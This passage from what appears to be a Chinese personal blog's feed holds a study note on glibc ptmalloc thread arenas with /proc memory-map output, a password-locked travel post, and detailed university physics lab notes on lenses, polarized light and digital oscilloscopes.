函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 <strong>thread arena</strong>。</p><p><strong>主线程用brk，子线程用mmap</strong></p><p><strong>注意</strong>：</p><blockquote><p>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread 1<br>After malloc and before free in thread 1<br>After free in thread 1<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p 00000000 00:00 0          [heap]<br>b7500000-b7521000 rw-p 00000000 00:00 0<br>b7521000-b7600000 ---p 00000000 00:00 0<br>b7604000-b7605000 ---p 00000000 00:00 0<br>b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025清明节出行反思</title>
    <link href="/%E5%87%BA%E8%A1%8C%E5%8F%8D%E6%80%9D/"/>
    <url>/%E5%87%BA%E8%A1%8C%E5%8F%8D%E6%80%9D/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f4e52445446ff9f136c6258c8378c96558396518f9a59be423a2f60c4678885a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是她的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>出行</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大物A1实验</title>
    <link href="/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6_%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C/"/>
    <url>/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6_%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="大连理工大学-大物实验"><a href="#大连理工大学-大物实验" class="headerlink" title="大连理工大学_大物实验"></a>大连理工大学_大物实验</h1><h2 id="几何光学实验"><a href="#几何光学实验" class="headerlink" title="几何光学实验"></a>几何光学实验</h2><h4 id="讲义："><a href="#讲义：" class="headerlink" title="讲义："></a>讲义：</h4><p>透镜是组成各种光学仪器的基本光学元件，焦距则是透镜的一个重要参数。在不同的使用场合往往要选择合适的透镜或透镜组，这就需要测定透镜的焦距。望远镜及显微镜是最常用的助视光学仪器，例如在物理实验中经常使用有读数显微镜、测量望远镜及自准望远镜等。在本实验中，同学们需要通过实验室给出的各种分立光学元件，<strong>按要求组成望远镜及显微镜</strong>。并利用<strong>所组成的聚焦于无穷远的望远镜进行透镜焦距的测定</strong>。</p><h5 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h5><ol><li>掌握测量薄透镜焦距的三种方法（自准直法、共轭法、物距像距法）</li><li>验证薄透镜成像规律，理解高斯公式的应用</li><li>搭建开普勒望远镜与显微镜，分析其工作原理及参数设计</li></ol><h5 id="实验器材："><a href="#实验器材：" class="headerlink" title="实验器材："></a>实验器材：</h5><table><thead><tr><th>仪器名称</th><th>参数|数量</th></tr></thead><tbody><tr><td>凸透镜</td><td>焦距：100mm、150mm、300mm、待测透镜×1</td></tr><tr><td>凹透镜2</td><td>焦距：50mm、150mm</td></tr><tr><td>平面镜、物屏</td><td>物屏：品字形、箭头形</td></tr><tr><td>光源与接收装置</td><td>光源：准平行LED白光光源，白屏</td></tr><tr><td>光具座系统</td><td>带刻度直线导轨（含滑块）</td></tr></tbody></table><h5 id="实验原理："><a href="#实验原理：" class="headerlink" title="实验原理："></a>实验原理：</h5><h6 id="1-凸透镜焦距焦距测量方法"><a href="#1-凸透镜焦距焦距测量方法" class="headerlink" title="1 凸透镜焦距焦距测量方法"></a>1 凸透镜焦距焦距测量方法</h6><p>常用的透镜焦距测定方法有物距像距法、共轭法和自准直法。</p><p><strong>1.1 自准直法</strong></p><p>自准直法测凸透镜焦距的光路图如图1所示。当物体处在凸透镜的焦平面时，物体上各点发出的光束，经凸透镜后成为不同方向的平行光束。若用一个与主光轴垂直的平面镜将平行光反射回去，则反射光再经透镜后会聚焦于透镜的焦平面上，所成像是一个与原物等大的倒立实像。凸透镜的焦距f<em>f</em>可直接通过测量物屏与凸透镜的距离得出。这就是自准直原理。自准直法的特点是，物、像在同一焦平面上。</p><p><img src="/./../00000000/image-20250408133205926.png" alt="image-20250408133205926"></p><p>自准直法是光学仪器调节中常用的重要方法。</p><p><strong>1.2 共轭法</strong></p><p>固定物体与像屏间的距离l不变，并使间距大于四倍的凸透镜焦距<em>f</em>。将凸透镜置于物体与像屏之间，移动凸透镜可以找到两个特定位置，使像屏上能得到清晰的实像，其中一个像为放大的像，另一个像为缩小的像。由高斯公式可以推出凸透镜焦距f<em>f</em>、物体与像屏间的距离l<em>l</em>，以及透镜在两个像之间移动的距离d<em>d</em>有如下关系：</p><p><img src="/./../00000000/image-20250408133853433.png" alt="image-20250408133853433"></p><p>通过测量l和d，利用（1）式就可计算出凸透镜的焦距<em>f</em>。</p><p><strong>1.3 物像法</strong></p><p>直接测量物距 <em>u</em> 与像距 <em>v</em>，利用高斯公式</p><p><img src="/./../00000000/image-20250408135617640.png" alt="image-20250408135617640"></p><p>计算透镜焦距.</p><h2 id="偏振光学实验"><a href="#偏振光学实验" class="headerlink" title="偏振光学实验"></a>偏振光学实验</h2><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>起偏器和检偏器其实是同一种器件，只是根据功能叫成不同名字而已；</li><li>功率探测器探头前面有个长筒，使光正入射打到内部的硅光电池上才能正确测量光功率；</li><li>在量程够用的情况下，光功率计的量程越小，测出结果的有效数位越多，越能反映出小信号的变化。验证马吕斯定律时这点尤为重要，因为接近消光的位置光信号会很弱；</li><li>日光灯的光是自然光，偏振度为0，转动检偏器观察会发现亮度没什么变化；射到地面上反射的光，偏振度会变得大于0，且会随着入射角的变化而变化，越是接近布儒斯特角偏振度越大。</li></ul><p>1808年，马吕斯（E. L. Malus，1775～1812）发现了光的偏振现象，通过对偏振现象的深入研究，人们充分地认识了光的本质–光波是横波。为了更好地认识和利用光的偏振性，各种偏振光元件、偏振光仪器应运而生。偏振光的应用技术也日益发展，在各个领域都得到广泛应用。</p><h4 id="预习重点"><a href="#预习重点" class="headerlink" title="预习重点"></a>预习重点</h4><ol><li>利用偏振片产生和检测偏振光的原理和方法；</li><li>偏振度，马吕斯定律；</li><li>布儒斯特角的产生原理和规律；</li><li>区分自然光、线偏振光、圆偏振光、椭圆偏振光的方法；</li><li>波片原理，波片光轴与起偏方向对偏振光类型的影响</li></ol><h4 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h4><ol><li>观察光的偏振现象，掌握利用偏振器来调节光强度的方法。</li><li>了解产生和检验偏振光的原理与方法，鉴别光的不同偏振状态。</li><li>设计实验来测量三棱柱的玻璃折射率，利用反射起偏测出布儒斯特角。</li></ol><h4 id="实验仪器"><a href="#实验仪器" class="headerlink" title="实验仪器"></a>实验仪器</h4><p>偏振片（格兰傅科棱镜，带游标刻度），<em>λ</em>&#x2F;2波片，<em>λ</em>&#x2F;4波片，三棱柱，测角台，光功率计及探头，半导体激光器</p><h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>光的干涉和衍射现象揭示了光的波动性，光的偏振特性进一步证明了光是横波。光的偏振现象在工业和生活中的应用广泛，因此同学们需要理解光的偏振性质，掌握偏振光检测方法。</p><h5 id="1-光的偏振态"><a href="#1-光的偏振态" class="headerlink" title="1. 光的偏振态"></a>1. 光的偏振态</h5><p>从垂直于光传播方向的平面上观察，光矢量变化遵从不同的规律，根据这些规律，可以把光分成偏振光、自然光和部分偏振光三种。</p><p>在垂直于光传播方向的平面上，光矢量的端点随时间变化如果是有规律的，则称其为完全偏振光。完全偏振光包含线偏振光、椭圆偏振光和圆偏振光。光矢量端点的轨迹是一直线的，称为线偏振光；光矢量端点的轨迹是椭圆的称为椭圆偏振光；光矢量端点的轨迹是圆的称为圆偏振光。根据振动的合成原理，线偏振光、椭圆偏振光和圆偏振光均可以等效为振动方向相互垂直、相互关联的两个线偏振光，并且这两个线偏振光需要具有相同的传播方向和频率，两者有确定的相位差。</p><p>普通光源直接发出的光是自然光。由于原子（或分子）发光具有随机性和间断性，不同原子（或分子）在同一时刻和同一原子（或分子）在不同时刻的发光都是不相干的。普通光源包含大量原子（或分子），这些原子（或分子）发出光的偏振方向、初相位都是随机的，因此发出的光波是不相干的。 值得注意的是对于自然光，由于自然光沿着不同方向振动的各光矢量的振幅和相位都是随机的，所以自然光可以等效成振幅相等，振动方向相互垂直，互不相关的两个线偏振光。</p><p>部分偏振光可以看作是自然光和偏振光的叠加。</p><h5 id="2-双折射晶体"><a href="#2-双折射晶体" class="headerlink" title="2. 双折射晶体"></a>2. 双折射晶体</h5><p>一束光入射到晶体界面时会发生折射。 在某些晶体中，折射光会分成两束，这就是晶体的双折射现象。这两束折射光中，一束光遵守折射定律称为寻常光，简称o光。另一束光则不遵守折射定律称为非常光，简称e光。 o光的传播速率各向同性，e光的传播速率与传播方向有关，o光和e光都是线偏振光。</p><p>在双折射晶体内部，存在某个特殊的方向，当光沿着该方向传播的时侯，不发生双折射，这个方向被称为该晶体的光轴。沿着光轴方向，o光和e光传播速度相同；垂直于光轴方向，o光和e光传播速度差异最大。按照光轴的数目不同，可以把双折射晶体分为单轴晶体和双轴晶体。单轴晶体如方解石、冰洲石、石英；双轴晶体如云母、黄玉。 本实验中采用的是单轴晶体。</p><p>必须注意，只有在晶体内部才有o光、e光之分，光线射出晶体之后都称为线偏振光。</p><h5 id="3-偏振器"><a href="#3-偏振器" class="headerlink" title="3. 偏振器"></a>3. 偏振器</h5><p>获得偏振光的途径很多。 当光在介质的界面上发生反射时，可以获得部分偏振光；满足特定条件时，可以获得线偏振光。如地球大气中的微粒、水分子等对阳光的散射，会形成线偏振光和部分偏振光。</p><p>在实际工作中，常采用专门的偏振器来获得线偏振光。偏振片是一种可以使入射光通过后变成线偏振光的光学薄膜，它能够吸收某一振动方向的光而透过与此垂直方向振动的光。偏振片允许光矢量透过的方向，称为偏振化方向或者透光方向。按实际应用时所起作用的不同，可以把偏振片分为起偏器和检偏器。用来产生偏振光的叫做起偏器，用来检验偏振光的则叫做检偏器。图1给出了线偏振光的产生与检测原理示意图。</p><p><img src="/./../00000000/image-20250408140242989.png" alt="image-20250408140242989"></p><p>双折射晶体可以把一束光分解成o光和e光，o光和e光都是线偏振光。利用这一特性，也可以利用双折射晶体制作偏振器。格兰棱镜，全称为格兰·泰勒棱镜，就是由两块冰洲石单轴晶体的直角棱镜组成偏振器。两块冰洲石的中间斜面为空气隙。光轴与入射端界面平行。自 然光垂直入射的时候，在第一个直角棱镜内，o光和e光传播方向相同但速度不同，在两个直角棱镜斜面处，e光传播方向不变，o光将发生全反射。若将棱镜侧面出射的o光吸收掉，则仅留下沿原入射方向传播的e光，则此格兰棱镜可以作为起偏器，当然也可以用作检偏器。图2给出了格兰棱镜的光路图。</p><p><img src="/./../00000000/image-20250408140447686.png" alt="image-20250408140447686"></p><h5 id="4-波片"><a href="#4-波片" class="headerlink" title="4.波片"></a>4.波片</h5><p>波片，也称作相位延迟片，是由双折射晶体做成，是从单轴晶体中切割下来的平面平行板，其表面平行于光轴。如图3所示。当一束单色平行自然光正入射（垂直于晶体光轴）到波片上时，光在晶体内部便分解为o光和e光。由于入射光垂直于光轴入射，o光和e光传播方向相同，但是传播速度不同，它们通过厚度确定的波片时的光程也就不同。</p><p><img src="/./../00000000/image-20250408140529810.png" alt="image-20250408140529810"></p><p>设波晶片的厚度为d，则两束光通过晶片后，有相位差</p><p><img src="/./../00000000/image-20250408140546654.png" alt="image-20250408140546654"></p><p>式中<em>λ</em>为光波在真空中的波长。</p><p>单色线偏振光垂直入射到波片内，分解为o光和e光，o光和e光在入射界面相位差为0，经过厚度确定的波片后两者产生一附加相位差<em>δ</em>。离开波片时两者又合二为一，合成光的性质取决于<em>δ</em>及入射光的性质。</p><ul><li>当δ&#x3D;2kπ<em>δ</em>&#x3D;2<em>kπ</em>时 , 则光程差(no−ne)d&#x3D;kλ(<em>n**o</em>−<em>n**e</em>)<em>d</em>&#x3D;<em>k**λ</em> ，即这样的晶片厚度可使o光和e光的光程差等于k <em>λ</em>，称为全波片(<em>λ</em>波片)。其o光和e光的合振动为线偏振光，其光矢量的方向与入射光光矢量的方向相同。</li><li>当δ&#x3D;(2k+1)π<em>δ</em>&#x3D;(2<em>k</em>+1)<em>π</em>时，则光程差(no−ne)d&#x3D;(2k+1)λ2(<em>n**o</em>−<em>n**e</em>)<em>d</em>&#x3D;(2<em>k</em>+1)2<em>λ</em>，此时晶片的厚度可使o光和e光的光程差等于(2k+1)λ&#x2F;2，称为半波片(λ&#x2F;2波片)。其合振动仍为线偏振光，但光矢量的方向相对于入射光的光矢量方向转过2θ角(θ是入射光振动面与波片光轴间的夹角)。</li><li>当<em>δ</em>&#x3D; (2<em>k</em> +1)<em>π</em>&#x2F;2 时，则光程差(no−ne)d&#x3D;(2k+1)λ4(<em>n**o</em>−<em>n**e</em>)<em>d</em>&#x3D;(2<em>k</em>+1)4<em>λ</em>，晶片的厚度可使o光和e光的光程差等于(2k+1)λ4(2<em>k</em>+1)4<em>λ</em>，称为四分之一波片( <em>λ</em>&#x2F;4波片)。其合振动一般为椭圆偏振光。应当注意两种特殊情况：当入射光矢量与波片光轴平行或垂直时，出射光为线偏振光；当入射光矢量与波片光轴夹角为<em>π</em>&#x2F;4时，出射光为圆偏振光。</li></ul><p>从以上可知<em>λ</em>&#x2F;4波片可将线偏振光变成椭圆偏振光或圆偏振光；根据光路的可逆性，它也可将椭圆偏振光或圆偏振光变成线偏振光。</p><p>需要强调的是，不论是全波片，半波片（<em>λ</em>&#x2F;2片），还是<em>λ</em>&#x2F;4片，都是针对特定波长的光而言的。</p><h5 id="5-布儒斯特定律"><a href="#5-布儒斯特定律" class="headerlink" title="5.布儒斯特定律"></a>5.布儒斯特定律</h5><p>光线斜射向非金属的光滑表面上（例如水、木头、玻璃等）时，反射光和折射光的偏振状态都会发生改变，反射光和折射光偏振的程度取决于光的入射角以及反射物的性质。当入射角是某一特定值时，反射光为线偏振光，相应的入射角 称为布儒斯特角，也称起偏角。起偏角和界面上两种介质的折射率有关：</p><p><img src="/./../00000000/image-20250408140632197.png" alt="image-20250408140632197"></p><p>式中<em>n</em>1和<em>n</em>2 分别为入射光和折射光所在介质的折射率。此关系称为布儒斯特定律。此时，不管入射光的偏振状态如何，反射光的光矢量垂直于入射面，如图4，若光是由空气入射到折射率为 <em>n</em> (≈1.5)的玻璃平面上，则i_b&#x3D;arctan⁡(n2&#x2F;n1)&#x3D;57°</p><p><img src="/./../00000000/image-20250408140735116.png" alt="image-20250408140735116"></p><p>如果自然光是以<em>i</em>b角入射到玻璃片堆上，则经过多次反射，最后从玻璃片堆透射出来的光一般是部分偏振光。如果玻璃片数目较大，则透射光近似为线偏振光。</p><h5 id="6-偏振光的检测"><a href="#6-偏振光的检测" class="headerlink" title="6.偏振光的检测"></a>6.偏振光的检测</h5><p><img src="/./../00000000/image-20250408140808992.png" alt="image-20250408140808992"></p><p><img src="/./../00000000/image-20250408141159642.png" alt="image-20250408141159642"></p><h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h6 id="1-光路调节"><a href="#1-光路调节" class="headerlink" title="1.光路调节"></a>1.光路调节</h6><p><img src="/./../00000000/image-20250408141216609.png" alt="image-20250408141216609"></p><p>如图6所示，调节激光器或者信号接收器，保证激光束射入信号接收器正中的小孔。</p><p>把P2（检偏器或起偏器P1）摆入系统，首先通过平移和升降调节，使激光束全部通过P2正中的透光部分而达到信号接收器：再左右转动P2（松开磁性表座的锁紧螺钉），使产生的反射光投射回到激光器垂直面上；继而调节P2支架上的水平和俯仰调节螺钉，使反射光斑基本与出射光斑重合，如图7所示，这表示P2的光学面(主截面)同系统的基准线(即激光束)垂直。</p><p><img src="/./../00000000/image-20250408141242762.png" alt="image-20250408141242762"></p><h6 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2.实验内容"></a>2.实验内容</h6><p><strong>1）线偏振光的获得与检验，马吕斯定律</strong></p><ol><li>在光源后加入起偏器P1和检偏器P2，旋转检偏器P2一周，观察光强的变化曲线。</li><li>旋转检偏器P2使出射光强为最大，以该角度为基准（0°），继续旋转检偏器180°，期间每隔10°，记录出射光强。最后画出光强随角度变化的曲线（它满足马吕斯定律吗？有何特点？）。</li><li>读取<em>I</em>，<em>I</em>&#x2F;2，<em>I</em>&#x2F;3对应的夹角。与通过马吕斯定律求出的<em>I</em>，<em>I</em>&#x2F;2，<em>I</em>&#x2F;3对应的夹角比较。</li></ol><p><strong>（2）*λ*&#x2F;2波片对线偏振光的调整和测量</strong></p><ol><li>旋转检偏器使P1、P2正交（完全消光）。</li><li>在P1、P2之间放入<em>λ</em>&#x2F;2波片，破坏其消光.转动检偏器P2至消光位置，并记录检偏器转动的角度，求出起偏器偏振化方向与<em>λ</em>&#x2F;2波片光轴的夹角。</li></ol><p><strong>（3）椭圆和圆偏振光的产生与鉴别</strong></p><p>利用<em>λ</em>&#x2F;4波片，改变入射线偏振光的偏振状态，产生线偏振光、椭圆偏振光和圆偏振光。</p><ol><li>旋转检偏器使P1、P2正交（完全消光）。</li><li>在P1、P2之间放入<em>λ</em>&#x2F;4波片，转动<em>λ</em>&#x2F;4波片使消光。</li><li>以上述得到的<em>λ</em>&#x2F;4波片角度为基准，将<em>λ</em>&#x2F;4波片依次转过15°、30°、45°、60°、75°和90°；同时，对于每一个<em>λ</em>&#x2F;4波片的角度下，都将检偏器P2 旋转360°，观察分析相应的6条光强曲线的特征和变化规律，从而判断6个角度产生的偏振光的特性(特别注意曲线的极大值、极小值和有无消光的零点)。最后，比较记录的 6 条曲线的强度变化特征和消光特征，画出曲线。自拟数据表格分析光的偏振状态，讨论 <em>λ</em>&#x2F;4波片对光的偏振的影响。</li></ol><p><strong>（4）布儒斯特定律的观察</strong></p><p>透过偏振片观察实验室地面反射的日光灯的虚像。旋转偏振片，观察并定性记录日光灯虚像亮度随旋转角度的变化。改变到日光灯的水平距离，重复前述过程。定性比较不同位置的偏振度变化，并利用布儒斯特定律解释该现象。</p><h6 id="3-实验拓展（选做）"><a href="#3-实验拓展（选做）" class="headerlink" title="3.实验拓展（选做）"></a>3.实验拓展（选做）</h6><p>利用全波片、<em>λ</em>&#x2F;2波片、<em>λ</em>&#x2F;4波片及偏振片观察偏振光的干涉现象</p><ol><li>旋转检偏器使P1、P2正交。分别在在P1、P2之间放入全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片，分别转动全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片一周，观察光电接收器接收的光强变化。（特别注意有无极大极小值，如果有，有几个极大极小值）</li><li>旋转检偏器使P1、P2平行（在光源后加入起偏器P1和检偏器P2，旋转检偏器P2使出射光强为最大）。分别在在P1、P2之间放入全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片，分别转动全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片一周，观察光电接收器接收的光强变化。（特别注意有无极大极小值，如果有，有几个极大极小值）</li><li>旋转检偏器使P1、P2既不正交也不平行。分别在在P1、P2之间放入全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片，分别转动全波片、<em>λ</em>&#x2F;2波片和<em>λ</em>&#x2F;4波片一周，观察光电接收器接收的光强变化。</li></ol><h4 id="课后思考题"><a href="#课后思考题" class="headerlink" title="课后思考题"></a>课后思考题</h4><ol><li>在正交的两个偏振片中插入<em>λ</em>&#x2F;4波片，将<em>λ</em>&#x2F;4波片旋转一周后，共出现几个光强极大值？</li><li>如何鉴别圆偏振光和自然光？如何鉴别椭圆偏振光和部分偏振光？</li></ol><h2 id="数字示波器实验"><a href="#数字示波器实验" class="headerlink" title="数字示波器实验"></a>数字示波器实验</h2><p>示波器是一种以图形方式显示电信号随时间变化的基础仪器。示波器不仅能观测周期变化的电压和电流信号（需用采样示波器），还能捕捉各种非周期性信号（如随机脉冲），并可进一步测量信号的幅度、频率、直流偏置、占空比等参数。用双踪示波器还可以检测两路信号在幅度、频率和相位之间的相对关系。而日常用的万用电表只能测量电学信号在一段时间内的平均值（对直流信号）或有效值（对交流信号）。</p><p>在科学研究和生产实践中经常将示波器与各类传感器配合使用。使用时，需要先将待检测的物理量（如温度、光强、压力、磁场等）转化成电学信号，再用示波器来监测。示波器的用途非常广泛，是功能最全面、应用最广泛的测量仪器之一。</p><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>了解数字示波器的工作原理</li><li>掌握数字示波器的基本操作方法</li><li>学会用数字示波器测量未知信号的参数</li><li>学会函数信号发生器的基本操作</li></ol><h3 id="实验仪器-1"><a href="#实验仪器-1" class="headerlink" title="实验仪器"></a>实验仪器</h3><ul><li>[RIGOL-DS2202A 数字示波器](<a href="https://supportcn.rigol.com/Public/Uploads/uploadfile/files/ftp/%E7%94%B5%E5%AD%90%E6%B5%8B%E9%87%8F%E4%BB%AA%E5%99%A8/%E7%A4%BA%E6%B3%A2%E5%99%A8/DS">https://supportcn.rigol.com/Public/Uploads/uploadfile/files/ftp/电子测量仪器/示波器/DS</a> MSO2000A&#x2F;中文手册&#x2F;MSO2000A&amp;DS2000A_UserGuide_CN.pdf)</li><li>[DG1022A 数字合成信号发生器](<a href="https://supportcn.rigol.com/Public/Uploads/uploadfile/files/ftp/%E7%94%B5%E5%AD%90%E6%B5%8B%E9%87%8F%E4%BB%AA%E5%99%A8/%E4%BF%A1%E5%8F%B7%E6%BA%90/%E4%BF%A1%E5%8F%B7%E6%BA%90">https://supportcn.rigol.com/Public/Uploads/uploadfile/files/ftp/电子测量仪器/信号源/信号源</a> 手册&#x2F;DG1022&#x2F;中文手册&#x2F;DG1000_UserGuide_CN.pdf)</li><li>同轴电缆</li><li>PVP2350无源探头</li></ul><h3 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h3><h4 id="1-示波器简介"><a href="#1-示波器简介" class="headerlink" title="1. 示波器简介"></a>1. 示波器简介</h4><p>示波器是一种监测电学信号随时间变化特性的常用测量仪器。日常生活中常用的万用电表只能测量电学信号在一段时间内的平均值（对直流信号）或有效值（对交流信号）；示波器还能观测反映电压和电流信号（需用采样示波器）随时间变化的特性，甚至还能捕捉各种非周期性信号（如随机脉冲）。可用示波器测量的物理量包括：幅度、频率、直流偏置、占空比等，用双踪示波器还可以检测两路信号在幅度、频率和相位之间的相对关系。</p><p>在科学研究和生产实践中使用时，人们常借助各类传感器（注1），先将待检测的物理量（如温度、光强、压力、磁场等）转化成电学信号，再用示波器来监测，这使得示波器的用途变得越来越广泛。</p><h4 id="2-示波器的发展"><a href="#2-示波器的发展" class="headerlink" title="2. 示波器的发展"></a>2. 示波器的发展</h4><p>根据实现技术不同，示波器可分为模拟示波器和数字示波器两大类。在阴极射线管（Cathode Ray Tube，简称CRT，国内也称之为显像管）诞生后不久，德国科学家Karl Ferdinand Braun于1897年发明基于CRT的模拟示波器，他将待监测的电压信号施加在平板电容两端，引起电子束的纵向偏转，以便在荧光屏上观测信号的变化。在1919年前后，就有人将示波器用于实验室测量，但使示波器更通用的触发-扫描功能则是在1946年前后才被发明的。</p><p>借助高速的模拟-数字转换芯片（也叫模数转换器，Analog-to-Digital Converter，以下简称ADC），Walter Le Cory发明了数字存储示波器（Digital Storage Oscilloscope，以下简称DSO）。DSO先通过ADC将待测的物理量转换成数字量，保存在存储芯片中，后续处理单元读取数据后再进行分析、显示。随着半导体技术的不断发展，数字存储示波器的触发、分析、测量等功能越来越强大，1980年之后逐步普及开来。</p><h4 id="3-数字存储示波器（DSO）的工作原理"><a href="#3-数字存储示波器（DSO）的工作原理" class="headerlink" title="3. 数字存储示波器（DSO）的工作原理"></a>3. 数字存储示波器（DSO）的工作原理</h4><p>图1给出了DSO一个通道信号处理过程的模块化示意图，其中虚线框内的组件是一个信号通道特有的组件，本实验中所用的双通道DSO就有两路这样的组件；虚框外的的组件1是系统组件，为所有信号通道所共用。这里还需注意：图中的每个组件既表示完成实际功能的功能单元，还可能关联一个用于让用户输入所需参数、状态的控制按钮或命令菜单。</p><p><img src="/./../00000000/image-20250421210514158.png" alt="image-20250421210514158"></p><p>其中虚线框内的组件是一个信号通道专用的（多通道示波器就有多套这样的组件）；框外组件表示所有信号通道共用的系统组件。CPU和DSP分别是Central Processing Unit（中央处理器）和Digital Signal Processor（数字信号处理器）的简称。（本示意图是在网络图片的基础上修改而成。）</p><p>与我们熟悉的电脑相似，DSO也有中央处理器（Central Processing Unit，以下简称CPU），它负责读取示波器面板上各个控制旋钮、命令菜单的参数设定、状态选择，控制内部各组件按要求工作，并完成必要的运算、测量等功能，最后将结果输出到显示屏上。这个过程中，信号接入到输入端口之后，先经过衰减、DC偏移、放大等处理得到合适幅度的信号，一路输入到ADC，进行模数转换并存储在存储器中以备后续调用，另一路耦合到触发逻辑，以实现所需的触发控制。</p><h4 id="4-组件功能介绍"><a href="#4-组件功能介绍" class="headerlink" title="4. 组件功能介绍"></a>4. 组件功能介绍</h4><p>① <strong>衰减器：</strong> 本实验中的数字示波器所用的ADC能够处理的电压幅度范围是±512mV，而示波器屏幕能够显示的电压范围是±20V或0~40V注3）。因此，我们需要根据输入信号的幅度（常用峰峰值Vpp表示）设定合理的测量档位，在大量程档时，示波器会依据我们的档位选择，通过衰减器中的电阻分压网提取一个与输入信号成正比的小信号输入到下一组件；在小量程档时，则是直接将信号无衰减地输入到下一组件。</p><p><img src="/./../00000000/image-20250421210545475.png" alt="image-20250421210545475"></p><p><strong>注3：</strong> 示波器输入端口附近标有电压测量范围，本实验中所用的DSO所标的测量范围是0-400V，远超过Vpp&#x3D;40V的实际可测范围。对于Vpp超过40V的信号，我们必须开启输入导线上的X10倍衰减开关（如图2所示），否则会导致仪器过载损坏。</p><p>② <strong>直流偏移：</strong> 在直流（Direct Current，以下简称DC）耦合状态下，若输入信号含有DC偏移量（即信号最大值与最小值的平均与实际零电位有偏差），需要提供极性相反的DC电压进行补偿，使信号正负两极的幅度相等，以便充分利用ADC的电压工作范围。若选择交流（Alternative Current，简称AC）耦合，则隔直电容将滤掉输入信号的DC偏移分量（注4)。</p><p><strong>注4：</strong> 当输入信号的频率在1kHz以上时，在DC和AC之间切换信号输入的耦合方式，信号形状的变化可以忽略；但若输入信号的频率小于1kHz，AC耦合时，隔直电容的存在对信号的形状有明显的影响。（欢迎有兴趣的同学自主探索。）</p><p>③ <strong>放大器：</strong> 为了充分利用下一组件ADC的测量精度，示波器会根据用户的输入档位选择，将小信号放大，以使信号变化的幅度范围Vpp占据尽量大比例的ADC工作电压范围。</p><p>④ <strong>模数转换器：</strong> 本实验所用DSO中的模数转换器（以下简称ADC）是一个电压工作范围为±512mV的8位转换器。也就是说，该ADC将任一电压在±512mV范围内变化的输入信号转化为一系列的8位的二进制数，代表不同时刻的输入电压值。由于8位二进制数的取值在0-255之间，测量精度是2-8≈0.4%，ADC输出值之间的最小差别是1024mV&#x2F;256&#x3D;4mV。因此，用示波器测量小信号（如100mV量级）时，必须选择合适的输入档位，为放大器设定合适的放大倍数，尽量使信号占据满屏，否则测量相对不确定度可能会大到无法接受的地步（注5)。</p><p><strong>注5：</strong> 对于一个变化范围只占据示波器屏幕一大格的输入信号，ADC转换的最小相对不确定度是多大？</p><p>⑤ <strong>触发(Trigger)：</strong> 